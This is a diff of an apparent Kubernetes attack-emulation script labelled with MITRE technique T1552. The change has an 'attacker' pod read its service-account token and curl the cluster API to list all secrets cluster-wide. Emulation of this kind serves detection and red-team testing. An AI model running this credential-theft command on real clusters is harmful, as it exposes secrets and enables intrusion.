@@ -14,7 +14,7 @@ sleep 3
 
 echo ""
 echo "### STEP 3: T1552 — secret access via K8s API (cluster-wide, real secrets) ###"
-kubectl exec attacker -- kubectl get secrets -A
+kubectl exec attacker -- bash -c 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -s -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets'
 sleep 2
 
 echo ""
